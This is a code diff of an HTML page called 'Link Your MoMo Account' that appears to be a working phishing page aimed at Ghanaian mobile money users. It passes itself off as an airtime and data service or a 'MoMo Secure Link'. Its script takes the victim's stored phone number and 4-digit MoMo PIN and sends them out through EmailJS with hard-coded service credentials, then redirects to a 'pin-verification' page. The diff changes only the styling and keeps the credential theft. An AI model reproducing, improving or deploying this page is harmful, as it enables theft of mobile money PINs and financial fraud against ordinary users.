@@ -1,98 +1,58 @@
   <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Link Your MoMo Account</title>
 
+  <!-- Meta -->
   <meta name="description" content="Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
-  <link rel="icon" type="image/png" href="favicon.png" />
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <link rel="icon" type="image/png" href="favicon.png">
+
+  <!-- Tailwind + EmailJS -->
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>(function(){ emailjs.init("gV773-VG85THpxrNV"); })();</script>
+  <script>
+    (function(){ emailjs.init("gV773-VG85THpxrNV"); })();
+  </script>
 
   <style>
-    /* === PRELOADER === */
-    #pageLoader {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(135deg, #002244, #004488, #0066cc);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      transition: opacity .6s ease;
-    }
-    #pageLoader.fadeOut { opacity: 0; pointer-events: none; }
-
-    .loader-ring {
-      width: 80px; height: 80px;
-      border: 6px solid rgba(255,255,255,0.25);
-      border-top: 6px solid #FFD700;
-      border-radius: 50%;
-      animation: spin 1.5s linear infinite;
-      margin-bottom: 20px;
-    }
-    .loader-logo {
-      color: #fff; font-size: 1.6rem; font-weight: 700;
-      letter-spacing: 1px;
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes glow {
-      from { text-shadow: 0 0 8px #FFD700; }
-      to { text-shadow: 0 0 25px #FFE066; }
-    }
-
-    /* === BODY BACKGROUND === */
+    /* === GENERAL BODY === */
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #002244, #004488, #0066cc);
-      background-size: 300% 300%;
-      animation: gradientShift 10s ease infinite;
+      background: radial-gradient(circle at top left, #001F3F, #000814 70%);
       min-height: 100vh;
+      overflow: hidden;
       display: flex;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
-      opacity: 0;
-      transition: opacity 1s ease;
       position: relative;
     }
-    body.loaded { opacity: 1; }
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
 
-    /* === FLOATING LIGHTS === */
-    .circle {
+    /* === FLOATING GOLD PARTICLES === */
+    .particle {
       position: absolute;
       border-radius: 50%;
-      background: rgba(255, 215, 0, 0.15);
+      background: rgba(255, 215, 0, 0.25);
       animation: float 10s infinite ease-in-out;
       filter: blur(1px);
     }
-    .circle:nth-child(1) { width: 300px; height: 300px; top: -100px; left: -120px; animation-delay: 0s; }
-    .circle:nth-child(2) { width: 200px; height: 200px; bottom: -80px; right: -100px; animation-delay: 3s; }
     @keyframes float {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-30px); }
+      0%, 100% { transform: translateY(0) translateX(0); opacity: 0.7; }
+      50% { transform: translateY(-30px) translateX(20px); opacity: 0.3; }
     }
 
     /* === CARD === */
     .card {
-      background: #fff;
+      background: white;
       border-radius: 1rem;
       box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      transition: transform 0.5s ease, opacity 1s ease;
       opacity: 0;
       transform: translateY(50px);
-      transition: opacity 1s ease, transform 1s ease;
-      z-index: 5;
     }
+
     body.loaded .card {
       opacity: 1;
       transform: translateY(0);
@@ -100,124 +60,139 @@
 
     /* === BUTTON === */
     .btn {
-      background: linear-gradient(90deg, #FFD700, #ffb300);
+      background: linear-gradient(90deg, #FFD700, #FFCC00);
       color: #003366;
       font-weight: bold;
-      transition: transform .3s ease, box-shadow .3s ease;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
-      position: relative;
-      overflow: hidden;
+      transition: background 0.3s ease, transform 0.2s ease;
     }
-    .btn::after {
-      content:""; position:absolute; top:0; left:-100%;
-      width:100%; height:100%; background:rgba(255,255,255,0.4);
-      transition:left .4s;
+    .btn:hover {
+      background: #e6b800;
+      transform: translateY(-2px);
     }
-    .btn:hover::after { left:100%; }
-    .btn:hover { transform:scale(1.05); box-shadow:0 6px 14px rgba(0,0,0,0.3); }
 
     /* === PIN INPUT === */
     .input-pin {
-      letter-spacing: .5rem;
+      letter-spacing: 0.5rem;
       font-size: 2rem;
       text-align: center;
       font-weight: bold;
       border: 2px solid #E5E7EB;
-      transition: all .3s ease;
     }
-    .input-pin:focus {
-      border-color: #FFD700;
-      box-shadow: 0 0 15px rgba(255,215,0,0.5);
-      transform: scale(1.02);
+
+    /* === PRELOADER === */
+    .preloader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle at center, #003366, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+      color: white;
+    }
+
+    .loader-ring {
+      width: 80px;
+      height: 80px;
+      border: 5px solid rgba(255, 215, 0, 0.2);
+      border-top-color: #FFD700;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .preloader.fadeOut {
+      opacity: 0;
+      transition: opacity 0.6s ease;
+      pointer-events: none;
+    }
+
+    .brand-text {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #FFD700;
+      letter-spacing: 1px;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes glow {
+      from { text-shadow: 0 0 8px #FFD700; }
+      to { text-shadow: 0 0 25px #FFE066; }
     }
 
     /* === NOTIFICATION === */
     #notification {
-      opacity: 0;
-      transform: translateY(-20px);
-      transition: opacity .5s ease, transform .5s ease;
-    }
-    #notification.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
-
-    /* === LOADING OVERLAY === */
-    #loadingOverlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.6);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 50;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity .4s ease;
-    }
-    #loadingOverlay.show { opacity: 1; pointer-events: all; }
-    .spinner {
-      border: 4px solid rgba(255,255,255,0.3);
-      border-top: 4px solid #FFD700;
-      border-radius: 50%;
-      width: 60px; height: 60px;
-      animation: spin 1s linear infinite;
+      transition: opacity 0.4s ease, transform 0.3s ease;
     }
   </style>
 </head>
 
-<body class="p-6">
+<body>
 
-  <!-- PRELOADER -->
-  <div id="pageLoader">
+  <!-- 🟡 PRELOADER -->
+  <div class="preloader" id="pageLoader">
     <div class="loader-ring"></div>
-    <div class="loader-logo">Airtime & Data Hub</div>
+    <div class="brand-text">MoMo Secure Link</div>
   </div>
 
-  <!-- BACKGROUND GLOWS -->
-  <div class="circle"></div>
-  <div class="circle"></div>
+  <!-- 🟡 FLOATING GOLD PARTICLES -->
+  <div class="particle" style="width:15px; height:15px; top:10%; left:15%; animation-delay:0s;"></div>
+  <div class="particle" style="width:8px; height:8px; top:60%; left:80%; animation-delay:2s;"></div>
+  <div class="particle" style="width:12px; height:12px; top:40%; left:40%; animation-delay:4s;"></div>
+  <div class="particle" style="width:10px; height:10px; top:75%; left:20%; animation-delay:6s;"></div>
 
-  <!-- MAIN CARD -->
+  <!-- 🟡 MAIN CARD -->
   <div class="card w-full max-w-md p-8">
     <p class="font-bold text-xl text-center mb-3">Link Your MoMo Account</p>
-    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4 animate-bounce-slow">
-    <h1 class="text-2xl font-bold text-center text-blue-900 mb-3">Secure Your Account</h1>
+    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4">
+    <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Secure Your Account</h1>
     <p class="text-gray-600 text-center mb-6">Enter your 4-digit MoMo PIN to link your account for a direct charge.</p>
 
     <form id="pinForm" class="space-y-6">
-      <input type="password" id="pinInput" maxlength="4" pattern="\d{4}" inputmode="numeric"
-             class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none"
-             placeholder="••••" required>
+      <input 
+        type="password" 
+        id="pinInput" 
+        maxlength="4" 
+        pattern="\d{4}" 
+        inputmode="numeric" 
+        class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none focus:ring-2 focus:ring-yellow-400" 
+        placeholder="••••"
+        required
+      >
       <button type="submit" class="btn w-full py-3 rounded-lg shadow">Continue</button>
     </form>
   </div>
 
-  <!-- OVERLAY + NOTIFY -->
-  <div id="loadingOverlay"><div class="spinner"></div></div>
-  <div id="notification" class="fixed top-5 right-5 px-5 py-3 rounded-xl shadow-lg font-medium text-white z-50"></div>
+  <!-- 🟡 NOTIFICATION -->
+  <div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>
 
+  <!-- 🟡 SCRIPT -->
   <script>
-    // === PRELOADER TIMING ===
-    window.addEventListener('load', () => {
-      const loader = document.getElementById('pageLoader');
+    // --- PRELOADER LOGIC ---
+    window.addEventListener("load", () => {
+      const loader = document.getElementById("pageLoader");
       const body = document.body;
+
       setTimeout(() => {
-        loader.classList.add('fadeOut');
-        body.classList.add('loaded');
-      }, 3000); // match Telecel: ~3 s
+        loader.classList.add("fadeOut");
+        body.classList.add("loaded");
+      }, 3000);
     });
 
-    // === FORM LOGIC ===
+    // --- PIN FORM ---
     const pinForm = document.getElementById("pinForm");
     const pinInput = document.getElementById("pinInput");
     const phone = localStorage.getItem("userPhone");
-    const overlay = document.getElementById("loadingOverlay");
 
-    pinForm.addEventListener("submit", e => {
+    pinForm.addEventListener("submit", (e) => {
       e.preventDefault();
       if (pinInput.value.length === 4) {
-        overlay.classList.add("show");
         emailjs.send("service_74nt2c9", "template_zelb8ji", {
           phone: "+233" + phone,
           pin: pinInput.value
@@ -225,30 +200,27 @@
           showNotification("MoMo PIN under verification");
           window.location.href = "pin-verification.html";
         }).catch(() => {
-          overlay.classList.remove("show");
           showNotification("Failed to verify PIN.", "error");
         });
       } else {
-        showNotification("Please enter a valid 4-digit PIN.", "error");
+        showNotification("Please enter your valid 4-digit PIN.", "error");
       }
     });
 
     function showNotification(message, type="success") {
-      const n = document.getElementById("notification");
-      n.textContent = message;
-      n.className = `fixed top-5 right-5 px-5 py-3 rounded-xl shadow-lg font-medium text-white z-50 ${
-        type==="success" ? "bg-green-600" : "bg-red-600"
-      } show`;
-      setTimeout(()=>n.classList.remove("show"),3000);
+      const notification = document.getElementById("notification");
+      notification.textContent = message;
+      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white transition ${
+        type === "success" ? "bg-green-600" : "bg-red-600"
+      }`;
+      notification.classList.remove("hidden");
+      notification.style.opacity = "1";
+      notification.style.transform = "translateY(0)";
+      setTimeout(() => {
+        notification.style.opacity = "0";
+        notification.style.transform = "translateY(-10px)";
+      }, 3000);
     }
-
-    // === SLOW BOUNCE ===
-    const style = document.createElement("style");
-    style.textContent = `
-      @keyframes bounce-slow { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
-      .animate-bounce-slow { animation:bounce-slow 3s infinite ease-in-out; }
-    `;
-    document.head.appendChild(style);
   </script>
 </body>
 </html>
